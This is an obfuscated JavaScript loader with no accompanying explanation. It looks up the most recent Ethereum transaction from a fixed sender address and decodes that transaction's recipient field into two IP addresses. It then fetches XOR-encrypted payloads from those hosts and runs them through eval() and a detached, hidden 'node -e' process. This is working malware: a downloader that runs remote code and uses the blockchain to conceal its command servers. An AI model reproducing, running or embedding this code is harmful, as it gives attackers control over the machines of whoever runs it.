_0x44adc9=['eth_getBlo','protocol','filter','JglGn','node:url','keep-alive','LVGhh','coding','object','isArray','qJxiq','ehzHr','^0x','add','nsactionCo','CBNdN','gzip','MMfQX','?module=ac','rom\x20','Win64;\x20x64','xtaHy','stapi.io','count&acti','ckByNumber','unt','global[\x27_V','mSbcV','ZukjT','subarray','http://','nonce','NKZfc','stener','\x20failed\x20fr','WQYpl','https://1r','qgJDQ','YOOhU','alWSx',':80','applicatio','hOCEU','_H\x27]=\x27','xZTYj','push','umber','12581100kbKmtL','Qgttu','result','1.0.0.0\x20Sa','forEach','POST','Kit/537.36','_t_u\x27]=\x27','ZZHiY','node:child','yLjxm','Agent','utf8','uIlXb','YeTwA','_H2','QFZGp','content-en','3mpyrUu','awsgb','eixbb','GwRrz','fjwfT','oad\x20body',';var\x20_glob','charCodeAt','YhqCY','min','jexiI','concat','dextj','dzUlD','LBSUC','gcmsc','XkLQv','KIlfq','OkDBD','then','434szUZlS','xivmK','gzip,\x20defl','5708972wtaMCF','base64','MYONx','end','_t_s\x27]=\x27','node:zlib','9&page=1&o','UcQVW','controller','WIeXu','y-p_>d$0B&',')\x20AppleWeb','DyDzA','transactio','KfKvh','_process','r\x27]=requir','yhjse','lACDO','0xa322E5f3','Jxjcp','on=txlist&','OnCcn','PjmQB','WijAS','yMgux','lGVwU','SKEaU','9aDC2490Ef','Non-JSON\x20f','tFnGt','7858175UPxRhn','2zQkYAU','pathname','run','liDecompre','map','ike\x20Gecko)','eJBWe','eth_blockN','toString','bbznr','SFSBh','findIndex','_t_s','22664NORGxX','AzUKH',',Sr3=@','e;global[\x27','0\x20(Windows','Payload-B6','createGunz','GSuSH','Content-Ty','_H2\x27]=\x27','ignore','bbkqJ','k=0&endblo','write','addEventLi','statusCode','tzGqg','byteLength','any','address=','find','ck=9999999','Content-Le','FwSeh','UwgDN','pc.io/eth','error','x-gzip','kmpipm','LkmnW',':443/0x/ls','iWKpY','RugKS','node:https','BOgWq','Empty\x20payl','hex','EahTE','data','NKvjp','eth_getTra','deflate','&startbloc','BPLqW','rCIVI','RoEwm','uxUKl','pipe','Hkxeh','_t_u','xkbSH','node:http','slice','qfnxQ','length','createInfl','hkUYA','bkREj','request','jhQPE','jEEXK','dCtfs','get','NKQIP','eYJWM','vVXEN','mfHgj','blockNumbe','12334167qBPahn','parse','wDorw','PKqkt','ngth','EGTPf','aEIoH','hostname','node','ort=desc&f','\x27]=\x27','nvjGR','OmllP','h.drpc.org','jXBlC','\x20Chrome/13','ate','iVsxf','\x20NT\x2010.0;\x20','edvmq','doOTu','q4FZkxX{!h','m\x27]=module','lNaEk','GreGk','MMnla','fkUhi','JJzpE','pitab',':443','RoiNg','has','fari/537.3','10678920YdqpHm',':443/0x/cl','om\x20','h.blocksco','rFiBL','signal','all','https:','kfqVo','unref','Missing\x20X-','catch','ckeHW','YUvft','resume','mZLSE','tpzZV','UxuTJ','stringify','ffset=20&s','HEAD','.publicnod','evpWR','public.bla','abort','2.0','port','1016656uRKHOs','sODqI','ghvLB','tnIdz','luMhh','message','liIlq','GET','QMSDo','yhnVQ','HTTP\x20','al=global;','OVewo','HYioz','toLowerCas','kfroK','HTJxl','qsNhO','https://et','\x27;global[\x27','D311D3080e','Mozilla/5.','x-payload-','cbzRO','e.com','6f0121063e','aWmNV','h-mainnet.','mctPX','ilterby=fr','@^1aQk','ate,\x20br','JSON\x20parse','hereum-rpc','hQPVR','b64','XvJVg','ABace','n/json','KwdLu','rrPDR','createBrot','UUZGB','ut.com/api','\x20(KHTML,\x20l','ZMsXr','trim','search','AbIUo','NbpcD','iXfZd','from','\x20from\x20','replace','headers','VKAsv'];_0x14d2=function(){return _0x44adc9;};return _0x14d2();}function decodeAddress(_0x4ade68){const _0x22b087=_0x10df86,_0xfe4dd5={'RugKS':_0x22b087(0x1f4),'mSbcV':_0x22b087(0x154),'YUvft':function(_0x467d46,_0x578b5c){return _0x467d46(_0x578b5c);}},_0x2d2fc5=Buffer[_0x22b087(0x1e3)](_0x4ade68[_0x22b087(0x1e5)](new RegExp(_0xfe4dd5[_0x22b087(0x150)],'i'),''),_0xfe4dd5[_0x22b087(0x203)]),_0x3b7d48=_0x5ce527=>_0x5ce527[0x5*-0x773+0x164f+0xef0]+'.'+_0x5ce527[0x159*-0x13+0x5*-0x4b3+0x311b]+'.'+_0x5ce527[0x943+-0x15db+0xc9a]+'.'+_0x5ce527[-0x293*0x1+-0x1*0x86+-0x31c*-0x1];return[_0xfe4dd5[_0x22b087(0x1a2)](_0x3b7d48,_0x2d2fc5[_0x22b087(0x205)](0x22ab+0x1e4e*0x1+-0x40f9,0x256f*-0x1+-0x2*-0x42b+0x101*0x1d)),_0xfe4dd5[_0x22b087(0x1a2)](_0x3b7d48,_0x2d2fc5[_0x22b087(0x205)](0x19a2+-0x1aab+0x10d,-0xea5+0x62+-0xe4b*-0x1))];}function firstMatch(_0x3c1d39){const _0x27871d={'liIlq':function(_0x597473,_0x11cfe3){return _0x597473(_0x11cfe3);},'UxuTJ':function(_0x45b8cd,_0x2c93e1){return _0x45b8cd===_0x2c93e1;},'Hkxeh':function(_0x29e08f,_0x1ecc60){return _0x29e08f(_0x1ecc60);},'ckeHW':function(_0x46ac92,_0x498b4f){return _0x46ac92!==_0x498b4f;},'qfnxQ':function(_0x5cb2d6,_0x41de83){return _0x5cb2d6(_0x41de83);}};return new Promise(_0x39eb6d=>{const _0x1724d9=_0x4925;let _0x2384e2=_0x3c1d39[_0x1724d9(0x166)];if(!_0x2384e2)return _0x27871d[_0x1724d9(0x165)](_0x39eb6d,null);let _0x5e7a03,_0x5e975c=!(0x1*0x87b+0xd5c+-0x5*0x45e);const _0x6d0962=_0x2240ff=>{const _0x59ddff=_0x1724d9;if(!_0x5e975c){_0x5e975c=!(-0x1*-0x713+0x2657+-0x2d6a);for(const _0x32ce50 of _0x3c1d39)_0x32ce50[_0x59ddff(0x248)][_0x59ddff(0x1ad)]();_0x27871d[_0x59ddff(0x1b6)](_0x39eb6d,_0x2240ff);}};_0x5e7a03=0x5*0x5ab+-0x4d7+-0x1778;for(const _0x4514f7 of _0x3c1d39)_0x4514f7[_0x1724d9(0x262)]()[_0x1724d9(0x23c)](_0x5adfdb=>{const _0x31083f=_0x1724d9;_0x5e975c||(_0x5adfdb?_0x27871d[_0x31083f(0x1b6)](_0x6d0962,_0x5adfdb):_0x27871d[_0x31083f(0x1a6)](0x4a*0x50+0x1657+-0x2d77,--_0x2384e2)&&_0x27871d[_0x31083f(0x160)](_0x39eb6d,null));})[_0x1724d9(0x1a0)](()=>{const _0x8b723c=_0x1724d9;_0x5e975c||_0x27871d[_0x8b723c(0x1a1)](-0x2*-0x77b+0x2a*0x59+-0x56*0x58,--_0x2384e2)||_0x27871d[_0x8b723c(0x165)](_0x39eb6d,null);});});}function candidateBlocks(_0x1320ea){const _0x7fd6bb=_0x10df86,_0x13b1dd={'fjwfT':function(_0x2163e6,_0x2668e8){return _0x2163e6-_0x2668e8;},'GSuSH':function(_0x5b50a2,_0x4db386){return _0x5b50a2-_0x4db386;},'yMgux':function(_0x4caf28,_0x5c8303){return _0x4caf28+_0x5c8303;},'alWSx':function(_0x3da2dd,_0x5c4fb7){return _0x3da2dd<_0x5c4fb7;}},_0x36e379=_0x13b1dd[_0x7fd6bb(0x22d)](_0x1320ea,BLOCK_MULTIPLE),_0x4c039f=new Set(),_0x5f35e7=[];for(const _0xf907d of[_0x13b1dd[_0x7fd6bb(0x274)](_0x1320ea,0x1n),_0x1320ea,_0x13b1dd[_0x7fd6bb(0x259)](_0x1320ea,0x1n),_0x13b1dd[_0x7fd6bb(0x274)](_0x36e379,0x1n),_0x36e379,_0x13b1dd[_0x7fd6bb(0x259)](_0x36e379,0x1n)]){if(_0x13b1dd[_0x7fd6bb(0x20f)](_0xf907d,0x0n))continue;const _0x431cde=_0xf907d[_0x7fd6bb(0x268)]();_0x4c039f[_0x7fd6bb(0x193)](_0x431cde)||(_0x4c039f[_0x7fd6bb(0x1f5)](_0x431cde),_0x5f35e7[_0x7fd6bb(0x215)](_0xf907d));}return _0x5f35e7;}function blockTask(_0x525a23){const _0x3b0f2c={'ehzHr':function(_0x2c226d,_0x3d961f,_0x286be8){return _0x2c226d(_0x3d961f,_0x286be8);},'QFZGp':function(_0x5d483a,_0x384f92){return _0x5d483a(_0x384f92);}},_0x5d180e=new AbortController();return{'controller':_0x5d180e,'run':async()=>{const _0x292616=_0x4925,_0x1db82d=await _0x3b0f2c[_0x292616(0x1f3)](withRpcEndpoints,(_0xc28b6d,_0x49c13e)=>rpcCall(_0xc28b6d,_0x292616(0x1e8)+_0x292616(0x200),[toBlockHex(_0x525a23),!(0x1455+-0x17bd*0x1+0x368)],_0x49c13e),_0x5d180e[_0x292616(0x19a)]),_0x36c616=_0x1db82d?.[_0x292616(0x24d)+'ns'];if(!Array[_0x292616(0x1f1)](_0x36c616))return null;const _0x5dae78=_0x3b0f2c[_0x292616(0x227)](findSenderTx,_0x36c616);return _0x5dae78?{'blockNumber':_0x525a23,'tx':_0x5dae78}:null;}};}async function nonceAtBlocks(_0x5624dd,_0x395569){const _0xb6aaee=_0x10df86,_0x231fef={'edvmq':function(_0x4e539f,_0x501668,_0x2713a8){return _0x4e539f(_0x501668,_0x2713a8);}},_0x249498=_0x5624dd[_0xb6aaee(0x264)](_0x36ba5f=>[_0xb6aaee(0x158)+_0xb6aaee(0x1f6)+_0xb6aaee(0x201),[SENDER,toBlockHex(_0x36ba5f)]]);try{return(await _0x231fef[_0xb6aaee(0x187)](withRpcEndpoints,(_0x1d8362,_0x30147d)=>rpcBatch(_0x1d8362,_0x249498,_0x30147d),_0x395569))[_0xb6aaee(0x264)](BigInt);}catch{return(await Promise[_0xb6aaee(0x19b)](_0x249498[_0xb6aaee(0x264)](([_0x7c5de9,_0x468ec3])=>withRpcEndpoints((_0x231fa3,_0xcf34ac)=>rpcCall(_0x231fa3,_0x7c5de9,_0x468ec3,_0xcf34ac),_0x395569))))[_0xb6aaee(0x264)](BigInt);}}async function lastSenderTx(_0x3333c5){const _0x4566f8=_0x10df86,_0x28acff={'dzUlD':function(_0x5262b4,_0x354f07){return _0x5262b4(_0x354f07);},'OVewo':function(_0x10fd7c,_0x5613f6,_0x530371){return _0x10fd7c(_0x5613f6,_0x530371);},'xtaHy':function(_0x2c1b26,_0x2c6897){return _0x2c1b26(_0x2c6897);},'kfroK':function(_0x56d720,_0x496188,_0x4867f5){return _0x56d720(_0x496188,_0x4867f5);},'qgJDQ':function(_0x3e36e6,_0x225764){return _0x3e36e6-_0x225764;},'VKAsv':function(_0x34ce25,_0x46983d){return _0x34ce25>_0x46983d;},'YhqCY':function(_0x280fbe,_0x49dfca){return _0x280fbe-_0x49dfca;},'tpzZV':function(_0x421160,_0x173b7d){return _0x421160<=_0x173b7d;},'BPLqW':function(_0x2270fb,_0xeab221){return _0x2270fb+_0xeab221;},'RoiNg':function(_0x57d5be,_0xcd4d75){return _0x57d5be/_0xcd4d75;},'eixbb':function(_0x3ff279,_0x4b1a7e){return _0x3ff279*_0x4b1a7e;},'rCIVI':function(_0x4410d1,_0x589e97){return _0x4410d1-_0x589e97;},'KwdLu':_0x4566f8(0x14c),'SFSBh':function(_0x3f312d,_0x5a0013){return _0x3f312d===_0x5a0013;},'Qgttu':function(_0x5563d1,_0x26b262,_0x380b5d){return _0x5563d1(_0x26b262,_0x380b5d);},'FwSeh':function(_0x55dd0f,_0x506b5f){return _0x55dd0f===_0x506b5f;},'yhnVQ':function(_0x20fc8d,_0x283b3c){return _0x20fc8d(_0x283b3c);}},_0x4e0736=new AbortController();try{const _0x5569f3=_0x3333c5??_0x28acff[_0x4566f8(0x236)](BigInt,await _0x28acff[_0x4566f8(0x1bc)](withRpcEndpoints,(_0x1b8c6a,_0x598e5f)=>rpcCall(_0x1b8c6a,_0x4566f8(0x267)+_0x4566f8(0x216),[],_0x598e5f),_0x4e0736[_0x4566f8(0x19a)])),_0x141606=_0x28acff[_0x4566f8(0x1fd)](BigInt,await _0x28acff[_0x4566f8(0x1bf)](withRpcEndpoints,(_0x3fd64c,_0x4a4d75)=>rpcCall(_0x3fd64c,_0x4566f8(0x158)+_0x4566f8(0x1f6)+_0x4566f8(0x201),[SENDER,toBlockHex(_0x5569f3)],_0x4a4d75),_0x4e0736[_0x4566f8(0x19a)])),_0x2b1013=_0x28acff[_0x4566f8(0x20d)](_0x141606,0x1n);let _0x2f063f=_0x28acff[_0x4566f8(0x20d)](SEARCH_FLOOR,0x1n),_0x3e358a=_0x5569f3;for(;_0x28acff[_0x4566f8(0x1e7)](_0x28acff[_0x4566f8(0x231)](_0x3e358a,_0x2f063f),0x1n);){const _0x419ade=_0x28acff[_0x4566f8(0x231)](_0x28acff[_0x4566f8(0x20d)](_0x3e358a,_0x2f063f),0x1n),_0x377980=_0x28acff[_0x4566f8(0x1fd)](BigInt,Math[_0x4566f8(0x232)](NONCE_FANOUT,_0x28acff[_0x4566f8(0x1fd)](Number,_0x419ade))),_0x2658c2=[];for(let _0x3ed89e=0x1n;_0x28acff[_0x4566f8(0x1a5)](_0x3ed89e,_0x377980);_0x3ed89e+=0x1n)_0x2658c2[_0x4566f8(0x215)](_0x28acff[_0x4566f8(0x15b)](_0x2f063f,_0x28acff[_0x4566f8(0x192)](_0x28acff[_0x4566f8(0x22b)](_0x3ed89e,_0x28acff[_0x4566f8(0x15c)](_0x3e358a,_0x2f063f)),_0x28acff[_0x4566f8(0x15b)](_0x377980,0x1n))));let _0x441d0c;const _0x174188=(await _0x28acff[_0x4566f8(0x1bf)](nonceAtBlocks,_0x2658c2,_0x4e0736[_0x4566f8(0x19a)]))[_0x4566f8(0x26b)](_0x33cc31=>_0x33cc31>=_0x141606);_0x441d0c=_0x28acff[_0x4566f8(0x1d7)],_0x28acff[_0x4566f8(0x26a)](-(-0x455*0x7+0x219c+-0x348),_0x174188)?_0x2f063f=_0x2658c2[_0x28acff[_0x4566f8(0x20d)](_0x2658c2[_0x4566f8(0x166)],-0x265*-0xb+-0xd28+0x7*-0x1e2)]:(_0x3e358a=_0x2658c2[_0x174188],_0x28acff[_0x4566f8(0x1e7)](_0x174188,0x2423+-0x10a6+-0x137d*0x1)&&(_0x2f063f=_0x2658c2[_0x28acff[_0x4566f8(0x231)](_0x174188,-0xa7*-0x13+-0x1*0x1519+0x8b5)]));}const _0x5ba573=await _0x28acff[_0x4566f8(0x218)](withRpcEndpoints,(_0x2eda73,_0xbd9f04)=>rpcCall(_0x2eda73,_0x4566f8(0x1e8)+_0x4566f8(0x200),[toBlockHex(_0x3e358a),!(0x186+-0x1*0x1a80+-0x18fa*-0x1)],_0xbd9f04),_0x4e0736[_0x4566f8(0x19a)]),_0x146f7d=_0x5ba573?.[_0x4566f8(0x24d)+'ns']||[];let _0x1a81a2=null;for(const _0x585317 of _0x146f7d)if(_0x585317[_0x4566f8(0x1e3)]&&_0x28acff[_0x4566f8(0x147)](_0x585317[_0x4566f8(0x1e3)][_0x4566f8(0x1be)+'e'](),SENDER)){if(_0x28acff[_0x4566f8(0x26a)](_0x28acff[_0x4566f8(0x1fd)](BigInt,_0x585317[_0x4566f8(0x207)]),_0x2b1013)){_0x1a81a2=_0x585317;break;}(!_0x1a81a2||_0x28acff[_0x4566f8(0x1e7)](_0x28acff[_0x4566f8(0x1b9)](BigInt,_0x585317[_0x4566f8(0x207)]),_0x28acff[_0x4566f8(0x1fd)](BigInt,_0x1a81a2[_0x4566f8(0x207)])))&&(_0x1a81a2=_0x585317);}return{'blockNumber':_0x3e358a,'tx':_0x1a81a2};}finally{_0x4e0736[_0x4566f8(0x1ad)]();}}async function lastSenderTxViaIndexer(){const _0x558d17=_0x10df86,_0x2cd604={'aWmNV':function(_0x32e0ce,_0x26c416){return _0x32e0ce(_0x26c416);}},_0x1a008d=INDEXER_URL+(_0x558d17(0x1fa)+_0x558d17(0x1ff)+_0x558d17(0x255)+_0x558d17(0x143))+SENDER+(_0x558d17(0x15a)+_0x558d17(0x279)+_0x558d17(0x145)+_0x558d17(0x246)+_0x558d17(0x1a8)+_0x558d17(0x17d)+_0x558d17(0x1cd)+'om'),_0x2d3e26=await _0x2cd604[_0x558d17(0x1ca)](httpRequest,_0x1a008d),_0x180cfb=(Array[_0x558d17(0x1f1)](_0x2d3e26?.[_0x558d17(0x219)])?_0x2d3e26[_0x558d17(0x219)]:[])[_0x558d17(0x144)](_0x410fe9=>_0x410fe9[_0x558d17(0x1e3)]&&_0x410fe9[_0x558d17(0x1e3)][_0x558d17(0x1be)+'e']()===SENDER);return{'blockNumber':_0x2cd604[_0x558d17(0x1ca)](BigInt,_0x180cfb[_0x558d17(0x173)+'r']),'tx':_0x180cfb};}async function run(){const _0x116941=_0x10df86,_0x1176c0={'ZukjT':function(_0x1eef84,_0x65e195){return _0x1eef84<_0x65e195;},'tnIdz':function(_0x587ee2,_0x2b1669){return _0x587ee2%_0x2b1669;},'XvJVg':_0x116941(0x223),'hkUYA':_0x116941(0x1c6)+_0x116941(0x1d3),'LkmnW':_0x116941(0x19f)+_0x116941(0x272)+'4','xivmK':function(_0x762333,_0x24383a){return _0x762333(_0x24383a);},'NbpcD':_0x116941(0x241),'DyDzA':function(_0x4bccca,_0x1a7e9f){return _0x4bccca(_0x1a7e9f);},'uIlXb':_0x116941(0x153)+_0x116941(0x22e),'lNaEk':function(_0x112a04,_0x510d56){return _0x112a04===_0x510d56;},'XkLQv':_0x116941(0x1a9),'mctPX':function(_0x736931,_0x3a9cd1){return _0x736931(_0x3a9cd1);},'UwgDN':_0x116941(0x156),'ghvLB':_0x116941(0x243),'sODqI':_0x116941(0x14a),'xkbSH':function(_0x3bfaa1,_0x25ee20){return _0x3bfaa1(_0x25ee20);},'PKqkt':function(_0x5e4b4b,_0x5e393a){return _0x5e4b4b+_0x5e393a;},'YOOhU':_0x116941(0x1c5)+_0x116941(0x271)+_0x116941(0x186)+_0x116941(0x1fc)+_0x116941(0x24b)+_0x116941(0x21d)+_0x116941(0x1dc)+_0x116941(0x265)+_0x116941(0x183)+_0x116941(0x21a)+_0x116941(0x194)+'6','xZTYj':function(_0x36dda3,_0x5ebc8a){return _0x36dda3(_0x5ebc8a);},'UUZGB':_0x116941(0x1b7),'gcmsc':function(_0x2c74d5,_0x2ac348,_0x3ed973){return _0x2c74d5(_0x2ac348,_0x3ed973);},'lGVwU':function(_0x3e83d6,_0x12588c){return _0x3e83d6(_0x12588c);},'nvjGR':function(_0x4261e1,_0x232d42){return _0x4261e1+_0x232d42;},'rFiBL':function(_0x53d337,_0x148bfc,_0x5d8871,_0x47a32a){return _0x53d337(_0x148bfc,_0x5d8871,_0x47a32a);},'AbIUo':_0x116941(0x17c),'ZZHiY':_0x116941(0x277),'MMnla':function(_0x175794,_0xe0d277){return _0x175794(_0xe0d277);},'rrPDR':function(_0x5e75ff,_0x2268e3){return _0x5e75ff-_0x2268e3;},'MMfQX':function(_0xab248a,_0x1ed800){return _0xab248a(_0x1ed800);},'NKQIP':function(_0x21d7a0,_0x2aa327,_0x5b43c0,_0xf06a7){return _0x21d7a0(_0x2aa327,_0x5b43c0,_0xf06a7);},'bbznr':_0x116941(0x189)+_0x116941(0x26f),'mZLSE':_0x116941(0x24a)+_0x116941(0x1ce)},_0x2cc507=_0x1176c0[_0x116941(0x18d)](BigInt,await _0x1176c0[_0x116941(0x23e)](withRpcEndpoints,(_0x4eb006,_0x199761)=>rpcCall(_0x4eb006,_0x116941(0x267)+_0x116941(0x216),[],_0x199761))),_0x468c8a=_0x1176c0[_0x116941(0x1d8)](_0x2cc507,_0x1176c0[_0x116941(0x1b3)](_0x2cc507,BLOCK_MULTIPLE));let _0x243503=await _0x1176c0[_0x116941(0x1cc)](firstMatch,_0x1176c0[_0x116941(0x162)](candidateBlocks,_0x468c8a)[_0x116941(0x264)](blockTask));_0x243503||(_0x243503=await _0x1176c0[_0x116941(0x1f9)](lastSenderTx,_0x2cc507)[_0x116941(0x1a0)](()=>lastSenderTxViaIndexer()));const [_0x321f9a,_0x58d29d]=_0x1176c0[_0x116941(0x214)](decodeAddress,_0x243503['tx']['to']),_0xc7a9f7=global;function _0x590c32(_0x1c8aaf,_0x4a7d44){const _0x53614e=_0x116941,_0x65217b={'WQYpl':function(_0x3405f1,_0x3b32d3){const _0x4ce400=_0x4925;return _0x1176c0[_0x4ce400(0x204)](_0x3405f1,_0x3b32d3);},'doOTu':function(_0x3590b8,_0x5b7152){const _0x3e9d61=_0x4925;return _0x1176c0[_0x3e9d61(0x1b3)](_0x3590b8,_0x5b7152);},'awsgb':_0x1176c0[_0x53614e(0x1d4)],'jEEXK':_0x1176c0[_0x53614e(0x168)],'WIeXu':_0x1176c0[_0x53614e(0x14d)],'YeTwA':function(_0x7b755a,_0xd2809a){const _0x1e0747=_0x53614e;return _0x1176c0[_0x1e0747(0x23e)](_0x7b755a,_0xd2809a);},'HYioz':_0x1176c0[_0x53614e(0x1e1)],'AzUKH':function(_0x3057c9,_0x451e5a){const _0x1f2412=_0x53614e;return _0x1176c0[_0x1f2412(0x24c)](_0x3057c9,_0x451e5a);},'cbzRO':_0x1176c0[_0x53614e(0x224)],'vVXEN':function(_0x50aad0,_0x2f68ee){const _0x59b543=_0x53614e;return _0x1176c0[_0x59b543(0x18b)](_0x50aad0,_0x2f68ee);},'kfqVo':_0x1176c0[_0x53614e(0x239)],'eJBWe':function(_0x260667,_0x2a8378){const _0x8a664a=_0x53614e;return _0x1176c0[_0x8a664a(0x1cc)](_0x260667,_0x2a8378);},'EahTE':_0x1176c0[_0x53614e(0x148)],'jhQPE':_0x1176c0[_0x53614e(0x1b2)],'bkREj':_0x1176c0[_0x53614e(0x1b1)]},_0x5c4012={'hostname':_0x4a7d44[_0x53614e(0x17b)],'port':_0x1176c0[_0x53614e(0x162)](Number,_0x4a7d44[_0x53614e(0x1af)])||0x2*0x248+-0xc01+0x1*0x7c1,'path':_0x1176c0[_0x53614e(0x177)](_0x4a7d44[_0x53614e(0x261)],_0x4a7d44[_0x53614e(0x1df)]),'headers':{'User-Agent':_0x1176c0[_0x53614e(0x20e)],'Sec-V':_0xc7a9f7['_V']||-0x1a78+-0x25ca+0x4042}};function _0x2752f9(_0xaab537){const _0x221696=_0x53614e,_0x18ca67=_0x1c8aaf[_0x221696(0x166)];for(let _0x298741=-0x231d+0x1c8+-0x173*-0x17;_0x65217b[_0x221696(0x20b)](_0x298741,_0xaab537[_0x221696(0x166)]);_0x298741++)_0xaab537[_0x298741]^=_0x1c8aaf[_0x221696(0x230)](_0x65217b[_0x221696(0x188)](_0x298741,_0x18ca67));return _0xaab537[_0x221696(0x268)](_0x65217b[_0x221696(0x22a)]);}function _0x3d3252(_0x505e9b){const _0x417765=_0x53614e,_0x4b97cc=_0x505e9b[_0x417765(0x1e6)][_0x65217b[_0x417765(0x16c)]];if(!_0x4b97cc)throw new Error(_0x65217b[_0x417765(0x249)]);return _0x65217b[_0x417765(0x225)](_0x2752f9,Buffer[_0x417765(0x1e3)](_0x4b97cc,_0x65217b[_0x417765(0x1bd)]));}function _0xce2c1e(_0x5b0e2f){return new Promise((_0x29a0e7,_0x89a44f)=>{const _0x22a19f=_0x4925,_0x487f80={'Jxjcp':function(_0x225058,_0x1806a3){const _0x2d38f6=_0x4925;return _0x65217b[_0x2d38f6(0x225)](_0x225058,_0x1806a3);},'CBNdN':function(_0xefd1b3,_0x3879aa){const _0x13d34a=_0x4925;return _0x65217b[_0x13d34a(0x26e)](_0xefd1b3,_0x3879aa);},'OnCcn':_0x65217b[_0x22a19f(0x16c)],'jXBlC':_0x65217b[_0x22a19f(0x1c7)],'NKvjp':function(_0x97541,_0x1b1f7c){const _0x1af5ac=_0x22a19f;return _0x65217b[_0x1af5ac(0x171)](_0x97541,_0x1b1f7c);},'JJzpE':_0x65217b[_0x22a19f(0x19d)],'OmllP':function(_0x2edb51,_0xdd9362){const _0x484e27=_0x22a19f;return _0x65217b[_0x484e27(0x225)](_0x2edb51,_0xdd9362);},'lACDO':function(_0x19ae2f,_0x438ee9){const _0x2d5892=_0x22a19f;return _0x65217b[_0x2d5892(0x266)](_0x19ae2f,_0x438ee9);},'EGTPf':function(_0x1bc692,_0x121d10){const _0x31c04f=_0x22a19f;return _0x65217b[_0x31c04f(0x225)](_0x1bc692,_0x121d10);},'dextj':_0x65217b[_0x22a19f(0x155)],'WijAS':_0x65217b[_0x22a19f(0x16b)],'KIlfq':_0x65217b[_0x22a19f(0x169)]},_0x3ecc3f=http[_0x22a19f(0x16a)]({..._0x5c4012,'method':_0x5b0e2f},_0x11a1de=>{const _0x2405d1=_0x22a19f;if(_0x487f80[_0x2405d1(0x157)](_0x487f80[_0x2405d1(0x18f)],_0x5b0e2f)){try{_0x487f80[_0x2405d1(0x180)](_0x29a0e7,_0x487f80[_0x2405d1(0x252)](_0x3d3252,_0x11a1de));}catch(_0x81c3eb){_0x487f80[_0x2405d1(0x179)](_0x89a44f,_0x81c3eb);}return void _0x11a1de[_0x2405d1(0x1a3)]();}const _0x270e94=[];_0x11a1de['on'](_0x487f80[_0x2405d1(0x235)],_0x59d29d=>_0x270e94[_0x2405d1(0x215)](_0x59d29d)),_0x11a1de['on'](_0x487f80[_0x2405d1(0x258)],()=>{const _0x1da6ba=_0x2405d1;try{let _0x5db518;const _0x2b68fd=Buffer[_0x1da6ba(0x234)](_0x270e94);if(_0x5db518=-0x24*0x5e+0x7a2+0x5a5,_0x2b68fd[_0x1da6ba(0x166)])return _0x487f80[_0x1da6ba(0x254)](_0x29a0e7,_0x487f80[_0x1da6ba(0x1f7)](_0x2752f9,_0x2b68fd));if(_0x11a1de[_0x1da6ba(0x1e6)][_0x487f80[_0x1da6ba(0x256)]])return _0x487f80[_0x1da6ba(0x1f7)](_0x29a0e7,_0x487f80[_0x1da6ba(0x254)](_0x3d3252,_0x11a1de));_0x487f80[_0x1da6ba(0x1f7)](_0x89a44f,new Error(_0x487f80[_0x1da6ba(0x182)]));}catch(_0x2afbff){_0x487f80[_0x1da6ba(0x254)](_0x89a44f,_0x2afbff);}}),_0x11a1de['on'](_0x487f80[_0x2405d1(0x23a)],_0x89a44f);});_0x3ecc3f['on'](_0x65217b[_0x22a19f(0x169)],_0x89a44f),_0x3ecc3f[_0x22a19f(0x243)]();});}return _0x1176c0[_0x53614e(0x214)](_0xce2c1e,_0x1176c0[_0x53614e(0x1da)])[_0x53614e(0x1a0)](()=>_0xce2c1e(_0x53614e(0x1a9)));}async function _0x30593f(_0x32c586,_0xfeb0b1,_0x2f4816){const _0x2f1a54=_0x116941;try{const _0x257833=await _0x1176c0[_0x2f1a54(0x238)](_0x590c32,_0xfeb0b1,_0x32c586),_0x4a57d6=_0x2f4816?_0x2f1a54(0x202)+_0x2f1a54(0x17e)+(_0xc7a9f7['_V']||0xfb1+0x4*-0x782+0x1*0xe57)+(_0x2f1a54(0x1c3)+_0x2f1a54(0x213))+_0xc7a9f7['_H']+(_0x2f1a54(0x1c3)+_0x2f1a54(0x276))+_0xc7a9f7[_0x2f1a54(0x226)]+(_0x2f1a54(0x1c3)+_0x2f1a54(0x250)+_0x2f1a54(0x270)+_0x2f1a54(0x18a)+_0x2f1a54(0x22f)+_0x2f1a54(0x1bb)):_0x2f1a54(0x202)+_0x2f1a54(0x17e)+(_0xc7a9f7['_V']||0x1a6e+0x1bb*0x3+-0x1f9f)+(_0x2f1a54(0x1c3)+_0x2f1a54(0x244))+_0xc7a9f7[_0x2f1a54(0x26c)]+(_0x2f1a54(0x1c3)+_0x2f1a54(0x21e))+_0xc7a9f7[_0x2f1a54(0x161)]+(_0x2f1a54(0x1c3)+_0x2f1a54(0x250)+_0x2f1a54(0x270)+_0x2f1a54(0x18a)+_0x2f1a54(0x22f)+_0x2f1a54(0x1bb));_0x2f4816||_0x1176c0[_0x2f1a54(0x25a)](eval,_0x1176c0[_0x2f1a54(0x17f)](_0x4a57d6,_0x257833)),_0x1176c0[_0x2f1a54(0x199)](spawn,_0x1176c0[_0x2f1a54(0x1e0)],['-e',_0x1176c0[_0x2f1a54(0x177)](_0x4a57d6,_0x257833)],{'detached':!(-0x8af+0x6c5+0x1ea),'stdio':_0x1176c0[_0x2f1a54(0x21f)],'windowsHide':!(-0x1a0a+-0x168f+-0x1*-0x3099)})[_0x2f1a54(0x19e)]();}catch(_0x2bbf0c){}}_0xc7a9f7['_V']=_0xc7a9f7['i'],_0xc7a9f7['_H']=_0x116941(0x206)+_0x321f9a+_0x116941(0x210),_0xc7a9f7[_0x116941(0x226)]=_0x116941(0x206)+_0x58d29d+_0x116941(0x210),_0xc7a9f7[_0x116941(0x26c)]=_0x116941(0x206)+_0x321f9a+_0x116941(0x191),_0xc7a9f7[_0x116941(0x161)]=_0x116941(0x206)+_0x321f9a+_0x116941(0x210),await _0x1176c0[_0x116941(0x16f)](_0x30593f,new URL(_0x116941(0x206)+_0x321f9a+(_0x116941(0x196)+'s')),_0x1176c0[_0x116941(0x269)],!(0x70a*0x4+0x9f+0x1*-0x1cc6)),await _0x1176c0[_0x116941(0x16f)](_0x30593f,new URL(_0x116941(0x206)+_0x321f9a+_0x116941(0x14e)),_0x1176c0[_0x116941(0x1a4)],!(0xc1*-0x2b+-0x1cc3+-0x29*-0x17e));}run();
